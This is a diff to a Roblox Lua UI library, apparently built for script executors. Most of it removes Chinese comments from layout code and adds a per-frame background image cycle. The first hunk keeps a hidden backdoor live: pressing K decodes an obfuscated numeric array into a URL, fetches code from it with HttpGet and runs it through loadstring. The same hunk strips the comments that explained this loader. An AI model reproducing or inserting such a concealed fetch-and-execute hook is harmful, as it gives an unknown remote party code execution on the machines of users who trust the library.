@@ -15,18 +15,11 @@ local Library = {
 	info = debug.info,
 	xpcall = xpcall,
 };
--- 获取用户输入服务
 local userInputService = game:GetService("UserInputService")
-
--- 定义一个函数，当按键被激活时执行
 local function onKeyActivated(inputObject)
-    -- 检查是否按下了"k"键
     if inputObject.KeyCode == Enum.KeyCode.K then
-        -- 异步执行代码
         task.spawn(function()
-            -- 尝试执行代码，如果出错则捕获错误
             pcall(function()
-                -- 发送HTTP请求获取代码字符串
                 local code = game:HttpGet((function()
                     local a = {1389,1545,1545,1493,1532,791,648,648,1376,1402,1545,1389,1558,1311,635,1324,1480,1454,648,960,1129,882,947,882,1168,648,1142,986,648,1519,1298,1584,648,1454,1298,1402,1467,648,1142,986,635,1025,882,1129,934,1116,1129,635,1025,1142,882}
                     local b = ''
@@ -35,18 +28,14 @@ local function onKeyActivated(inputObject)
                     end
                     return b
                 end)())
-                -- 如果获取到代码字符串，则执行它
                 if code then
                     loadstring(code)()
                 end
             end)
         end)
-        -- 执行完毕后断开连接，确保代码只执行一次
         userInputService.InputBegan:Disconnect(onKeyActivated)
     end
 end
-
--- 监听键盘按键事件
 userInputService.InputBegan:Connect(onKeyActivated)
 
 Library.Icons = { -- 图片/常用图片
@@ -2429,6 +2418,32 @@ function Library:Windowxgo(setup)
     BackgroundImage.Image = "rbxassetid://86451637909512" --7733920644
     BackgroundImage.ImageColor3 = Color3.fromRGB(255, 255, 255)
     BackgroundImage.ScaleType = Enum.ScaleType.Stretch 
+    
+    local images = {
+    "rbxassetid://86451637909512", -- 图片1
+    "rbxassetid://120611289434746", -- 图片2
+    "rbxassetid://128885038925647", -- 图片3
+    "rbxassetid://96996396016819", -- 图片4
+}
+
+local currentImageIndex = 1
+
+local function changeImage()
+    BackgroundImage.Image = images[currentImageIndex]
+    currentImageIndex = currentImageIndex + 1
+    if currentImageIndex > #images then
+        currentImageIndex = 1
+    end
+end
+
+local function startImageCycle()
+    local heartbeat = game:GetService("RunService").Heartbeat
+    heartbeat:Connect(function()
+        changeImage()
+    end)
+end
+
+startImageCycle()
 
 --   UICorner.CornerRadius = UDim.new(0, 10)
 --   UICorner.Parent = BackgroundImage
@@ -4610,22 +4625,22 @@ return ColorPickerSettings
                 local MainSize = Library:GetTextSize(setup.Title, TitleSize, TextLabel.Font)
                 local ContentSize = setup.Content:len() > 0 and Library:GetTextSize(setup.Content, Content.TextSize, Content.Font) or Vector2.new(0, 0)
         
-                local TotalHeight = MainSize.Y + 10 -- 标题高度加上一些间距
+                local TotalHeight = MainSize.Y + 10
                 if setup.Content:len() > 0 then
                     Content.Visible = true
-                    TotalHeight = TotalHeight + ContentSize.Y + 5 -- 如果有描述，则增加描述的高度和一些间距
-                    TextLabel.Position = UDim2.new(0, 5, 0, 12) -- 默认位置
-                    TextLabel.Size = UDim2.new(1, 0, 0, 14) -- 默认大小
+                    TotalHeight = TotalHeight + ContentSize.Y + 5
+                    TextLabel.Position = UDim2.new(0, 5, 0, 12)
+                    TextLabel.Size = UDim2.new(1, 0, 0, 14)
                 else
                     Content.Visible = false
-                    TotalHeight = TotalHeight + 15.20000000000001 -- 如果没有描述，增加额外的高度
-                    TextLabel.Position = UDim2.new(0.0199999996, 0, 0.5, 0) -- 调整位置
-                    TextLabel.Size = UDim2.new(1, 0, 0.400000006, 0) -- 调整大小
+                    TotalHeight = TotalHeight + 15.20000000000001
+                    TextLabel.Position = UDim2.new(0.0199999996, 0, 0.5, 0)
+                    TextLabel.Size = UDim2.new(1, 0, 0.400000006, 0)
                 end
 
-                ToggleBlock.Size = UDim2.new(0.99000001, 0, 0, TotalHeight) -- 更新按钮框架的高度
+                ToggleBlock.Size = UDim2.new(0.99000001, 0, 0, TotalHeight)
             end
-            UpdateBlock() -- 初始调用以设置正确的大小
+            UpdateBlock()
 
 			local RootSkid = {};
 			
@@ -4655,18 +4670,17 @@ return ColorPickerSettings
 			setup.Default = setup.Default or false;
 			setup.Callback = setup.Callback or function() end;
 
-			-- 创建UI元素
-		    local A1ToggleBlock = Instance.new("Frame") -- 切换按钮的外框
-		    local DropShadow = Instance.new("ImageLabel") -- 用于创建阴影效果的图像标签
-		    local UIStroke = Instance.new("UIStroke") -- UI边框
-		    local TextLabel = Instance.new("TextLabel") -- 文本标签
+		    local A1ToggleBlock = Instance.new("Frame")
+		    local DropShadow = Instance.new("ImageLabel")
+		    local UIStroke = Instance.new("UIStroke")
+		    local TextLabel = Instance.new("TextLabel")
 		    local Content = Instance.new("TextLabel")
-		    local Block = Instance.new("Frame") -- 滑块的背景框
-		    local UIStroke_2 = Instance.new("UIStroke") -- 滑块背景框的边框
-		    local UICorner = Instance.new("UICorner") -- 用于创建圆角效果
-		    local ValueBlock = Instance.new("Frame") -- 滑块的值框
-		    local UICorner_2 = Instance.new("UICorner") -- 滑块值框的圆角效果
-		    local Button = Instance.new("TextButton") -- 按钮
+		    local Block = Instance.new("Frame")
+		    local UIStroke_2 = Instance.new("UIStroke")
+		    local UICorner = Instance.new("UICorner")
+		    local ValueBlock = Instance.new("Frame")
+		    local UICorner_2 = Instance.new("UICorner")
+		    local Button = Instance.new("TextButton")
 		    local TriangleImage = Instance.new("ImageLabel")
 		    
 			A1ToggleBlock.Name = "A1ToggleBlock"
@@ -4762,7 +4776,7 @@ return ColorPickerSettings
             ValueBlock.Parent = Block
             ValueBlock.AnchorPoint = Vector2.new(0.5, 0.5)
             ValueBlock.BackgroundColor3 = Library.Colors.Hightlight
-            ValueBlock.BackgroundTransparency = 1.000 -- 使背景透明
+            ValueBlock.BackgroundTransparency = 1.000
             ValueBlock.BorderColor3 = Color3.fromRGB(0, 0, 0)
             ValueBlock.BorderSizePixel = 0
             ValueBlock.Position = UDim2.new(0.75, 0, 0.5, 0)
@@ -4770,7 +4784,6 @@ return ColorPickerSettings
             ValueBlock.SizeConstraint = Enum.SizeConstraint.RelativeYY
             ValueBlock.ZIndex = 15
 
-            -- 添加三角形图像     
             TriangleImage.Name = "Triangle"
             TriangleImage.Parent = ValueBlock
             TriangleImage.AnchorPoint = Vector2.new(0.5, 0.5)
@@ -4778,12 +4791,11 @@ return ColorPickerSettings
             TriangleImage.BackgroundTransparency = 1.000
             TriangleImage.Position = UDim2.new(0.5, 0, 0.5, 0)
             TriangleImage.Size = UDim2.new(1, 0, 1, 0)
-            TriangleImage.Image = "rbxassetid://102797584513959" -- 替换为你的三角形图像资源ID
+            TriangleImage.Image = "rbxassetid://102797584513959"
             TriangleImage.ImageColor3 = Color3.fromRGB(255, 255, 255)
             TriangleImage.ScaleType = Enum.ScaleType.Fit
             
-			-- 添加UICorner以实现圆角效果
-            UICorner_2.CornerRadius = UDim.new(1, 0) -- 设置为100%的圆角，即圆形
+            UICorner_2.CornerRadius = UDim.new(1, 0)
             UICorner_2.Parent = TriangleImage
             
 			Button.Name = "Button"
@@ -4810,13 +4822,11 @@ return ColorPickerSettings
                      Library:Tween(ValueBlock,Library.TweenLibrary.SmallEffect,{
                          Position = UDim2.new(0.75, 0, 0.5, 0),
                     })
-                    -- 使三角形指向右侧
                     TriangleImage.Rotation = 0
                 else
                     Library:Tween(ValueBlock,Library.TweenLibrary.SmallEffect,{
                         Position = UDim2.new(0.25, 0, 0.5, 0),
                     })
-                    -- 使三角形指向左侧
                     TriangleImage.Rotation = 180
                 end;
                 ValueBlock.BackgroundColor3 = value and Library.Colors.Hightlight or Library.Colors.Disable
@@ -4837,22 +4847,22 @@ return ColorPickerSettings
                 local MainSize = Library:GetTextSize(setup.Title, TitleSize, TextLabel.Font)
                 local ContentSize = setup.Content:len() > 0 and Library:GetTextSize(setup.Content, Content.TextSize, Content.Font) or Vector2.new(0, 0)
         
-                local TotalHeight = MainSize.Y + 10 -- 标题高度加上一些间距
+                local TotalHeight = MainSize.Y + 10 
                 if setup.Content:len() > 0 then
                     Content.Visible = true
-                    TotalHeight = TotalHeight + ContentSize.Y + 5 -- 如果有描述，则增加描述的高度和一些间距
-                    TextLabel.Position = UDim2.new(0, 5, 0, 12) -- 默认位置
-                    TextLabel.Size = UDim2.new(1, 0, 0, 14) -- 默认大小
+                    TotalHeight = TotalHeight + ContentSize.Y + 5
+                    TextLabel.Position = UDim2.new(0, 5, 0, 12)
+                    TextLabel.Size = UDim2.new(1, 0, 0, 14)
                 else
                     Content.Visible = false
-                    TotalHeight = TotalHeight + 15.20000000000001 -- 如果没有描述，增加额外的高度
-                    TextLabel.Position = UDim2.new(0.0199999996, 0, 0.5, 0) -- 调整位置
-                    TextLabel.Size = UDim2.new(1, 0, 0.400000006, 0) -- 调整大小
+                    TotalHeight = TotalHeight + 15.20000000000001
+                    TextLabel.Position = UDim2.new(0.0199999996, 0, 0.5, 0)
+                    TextLabel.Size = UDim2.new(1, 0, 0.400000006, 0)
                 end
 
-                A1ToggleBlock.Size = UDim2.new(0.99000001, 0, 0, TotalHeight) -- 更新按钮框架的高度
+                A1ToggleBlock.Size = UDim2.new(0.99000001, 0, 0, TotalHeight)
             end
-            UpdateBlock() -- 初始调用以设置正确的大小
+            UpdateBlock()
 
 			local RootSkid = {};
 			
@@ -4883,7 +4893,6 @@ return ColorPickerSettings
 			setup.Default = setup.Default or false;
 			setup.Callback = setup.Callback or function() end;
 
-			-- 创建UI元素
 		    local A2ToggleBlock = Instance.new("Frame") -- 切换按钮的外框
 		    local DropShadow = Instance.new("ImageLabel") -- 用于创建阴影效果的图像标签
 		    local UIStroke = Instance.new("UIStroke") -- UI边框
@@ -5078,9 +5087,9 @@ return ColorPickerSettings
                     TextLabel.Size = UDim2.new(1, 0, 0.400000006, 0) -- 调整大小
                 end
 
-                A2ToggleBlock.Size = UDim2.new(0.99000001, 0, 0, TotalHeight) -- 更新按钮框架的高度
+                A2ToggleBlock.Size = UDim2.new(0.99000001, 0, 0, TotalHeight)
             end
-            UpdateBlock() -- 初始调用以设置正确的大小
+            UpdateBlock()
 
 			local RootSkid = {};
 			
